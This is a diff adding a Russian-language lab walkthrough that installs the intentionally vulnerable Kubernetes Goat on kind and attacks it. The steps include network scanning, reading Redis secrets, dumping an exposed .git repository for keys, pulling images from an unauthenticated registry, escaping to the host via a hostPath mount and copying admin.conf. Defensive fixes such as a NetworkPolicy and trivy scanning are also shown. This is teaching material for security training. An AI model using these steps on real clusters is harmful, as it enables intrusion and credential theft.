@@ -1,0 +1,200 @@
+# Устанавливаем стенд
+
+## Ставим kind
+https://kind.sigs.k8s.io/docs/user/quick-start/#installation
+
+Чтобы установить k8s-goat адекватно на kind нужно пробросить дополнительный порт для доступа к NodePort - особенность Kind.
+
+Для установки нужно:
+```bash
+cat << EOF | kind create cluster --config=-
+kind: Cluster
+apiVersion: kind.x-k8s.io/v1alpha4
+nodes:
+- role: control-plane
+  extraPortMappings:
+  - containerPort: 30003
+    hostPort: 30003
+    protocol: TCP
+EOF
+```
+
+Далее ждём минуту пока поднимется кластер.
+
+Нужно установить сам goat:
+```bash
+git clone https://github.com/madhuakula/kubernetes-goat.git
+cd kubernetes-goat
+bash ./setup-kubernetes-goat.sh
+bash ./access-kubernetes-goat.sh
+```
+Далее ждём перехода всех контейнеров в статус Ready.
+
+# Атакуем кластер
+## Сканируем сеть (K07: Missing Network Segmentation Controls, K08: Secrets Management Failures)
+
+Давайте поищем порты редиса 6379:
+Для этого:
+```bash
+kubectl run -it hacker-container --image=madhuakula/hacker-container -- sh
+ip a
+nmap -p 6379 10.244.0.0/24 #Сеть может быть другой
+```
+
+Мы видим открытый Redis:
+Подключаемся и забираем флаг
+```bash
+redis-cli -h 10.244.0.1
+KEYS *
+GET SECRETSTUFF
+```
+
+Почему так просто? По-умолчанию нет изоляции по сети. За сеть в Kubernetes отвечает CNI. Мы с вами не заметили, но kind сам установил такой плагин - его под:
+
+```bash
+kubectl describe pod $(kubectl get pods --no-headers -o custom-columns=":metadata.name" -n kube-system | grep "kindnet") -n kube-system
+```
+
+По-умолчанию, kubernetes не изолирует сетевые взаимодействия. И не представляет плагин CNI, на который ложится логика реализации сетевого взаимодействия, в том числе файерволинг.
+
+Для того, чтобы изоляция работала, нужно создать политику. Для этого воспользуемся специальным универсальным API и создадим network policy:
+
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: goat-nsp
+spec:
+  podSelector: {}
+  ingress:
+    - from:
+        - podSelector: {}
+  egress:
+    - to:
+        - namespaceSelector: {}
+          podSelector:
+            matchLabels:
+              k8s-app: kube-dns
+      ports:
+        - port: 53
+          protocol: UDP
+    - to:
+        - podSelector: {}
+```
+
+Она разрешит только трафик внутри неймспейса контейнера и DNS трафик в кластере.
+
+Настройка зависит от API, который есть в k8s и в реализации самого CNI, например для CNI Cillium есть некоторые расширенные возможности, например возможность фильтрации по FQDN, возможность реализации L7 политик и создание clusterwide политик, т.к наш пример работает только в namespace default.
+А ещё есть прекрамный инструмент https://editor.networkpolicy.io/?id=0PPZfAAjQvVBoLL2 который поможет разобраться с написание политик.
+
+Применим политику и убедимся, что доступа больше нет.
+```bash
+cat << EOF | kubectl apply -f -
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: goat-nsp
+spec:
+  podSelector: {}
+  ingress:
+    - from:
+        - podSelector: {}
+  egress:
+    - to:
+        - namespaceSelector: {}
+          podSelector:
+            matchLabels:
+              k8s-app: kube-dns
+      ports:
+        - port: 53
+          protocol: UDP
+    - to:
+        - podSelector: {}
+EOF
+```
+## Враг внутри (K02: Supply Chain Vulnerabilities)
+
+На самом деле не обязательно идти за пределы неймспейса, чтобы получить информацию. Давайте выполним команду env.
+Мы видим вывод в переменную адресов многих сервисов, давайте попробуем зайти на следующий:
+```bash
+curl http://10.96.140.16:3000
+```
+Похоже на сайт с кодом.
+Не будем погружаться в особенности фазинга сайтов через тотже owasp zap (можете сделать это локально дома), но попробуем найти конфиг репозитория по пути:
+```bash
+curl  http://10.96.140.16:3000/.git/config
+```
+Ага. Есть репозиторий, давайте его скачаем
+```bash
+git clone https://github.com/internetwache/GitTools.git
+
+./GitTools/Dumper/gitdumper.sh http://10.96.140.16:3000/.git/ code-app
+
+trufflehog code-app/
+```
+
+Заботливо подготовленный заранее trufflehog нашёл ключ, но можно достичь этого и просто через git log, git show d7c173ad183c574109cd5c4c648ffe551755b576
+
+## Ну поправили это, а что ещё? (K02: Supply Chain Vulnerabilities, CICD-SEC-6/2)
+
+У нас в nmap было не только уязвимое веб приложение был ещё порт 5000. Что там?
+```bash
+curl http://10.244.0.12:5000/v2/_catalog
+```
+А там какие-то образы, которые мы получили без аутентификации.
+Давайте его изучим?
+
+```bash
+curl http://10.244.0.12:5000/v2/madhuakula/k8s-goat-users-repo/manifests/latest
+```
+
+grep -i key и мы видим GPG ключ и токен-флаг.
+
+Почему так? По умолчанию в registry v2 не реализована аутентификация. В конфиге можно включить Basic и Token (jwt). Можно реализовать самому, а можно взять Jfrog, Nexus, Gitlab, Harbor.
+## Убегаем (K01: Insecure Workload Configurations, K03: Overly Permissive RBAC Configurations)
+
+Давайте посмотрим, что ещё есть интересного.
+
+```bash
+curl http://10.244.0.7:8080
+```
+
+Вывод говорит нам, что это gotty для которого есть клиент - ставим и подключаемся. Мы в терминале
+
+```bash
+apk add go
+go get github.com/moul/gotty-client/cmd/gotty-client
+go/bin/gotty-client --v2 http://10.244.0.7:8080/
+```
+
+Делаем df -h или capsh --print и видим что много подов и маун /host-system. Подключимся к нему.
+
+```bash
+chroot /host-system bash
+
+#Если не получится со стандартным кубконфигом
+cp /etc/kuberntetes/admin.conf /root/.kube/config
+sed -i 's/kind-control-plane:6443/10.96.0.1:443/g' /root/.kube/config
+```
+
+Пробуем получить доступ к кластеру Kubernetes:
+```bash
+kubectl auth whoami
+```
+
+Видим, что мы админы. На этом всё.
+
+## Огласите весь список пожалуйста
+Раз уж мы получили доступ к админ токену, то почему бы нам не посмотреть список всех уязвимостей в кластере.
+Сохраним конфиг админа из /etc/kuberntetes/admin.conf ну или нет, т.к это тот же конфиг, что и у нас на ноде =)
+Установим trivy.
+```bash
+https://trivy.dev/latest/getting-started/installation/
+```
+И запустим
+```bash
+trivy k8s --report summary
+```
+export KUBECONFIG=config
+trivy k8s --report summary
+```
